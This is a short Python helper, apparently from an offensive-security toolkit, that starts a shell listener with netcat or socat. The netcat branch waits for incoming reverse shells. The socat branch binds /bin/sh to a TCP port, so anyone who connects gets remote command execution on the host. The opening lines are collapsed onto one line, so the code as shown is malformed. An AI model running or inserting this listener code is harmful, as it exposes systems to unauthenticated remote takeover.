import subprocess

def start_listener(tool, lport): try: if tool == "nc": print(f"[*] Starting Netcat listener on port {lport}...") subprocess.call(["nc", "-lvnp", str(lport)])

elif tool == "socat":
        print(f"[*] Starting Socat listener on port {lport}...")
        cmd = f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh"
        subprocess.call(cmd, shell=True)

    else:
        print("[!] Unsupported listener type.")

except KeyboardInterrupt:
    print("\n[!] Listener stopped by user.")

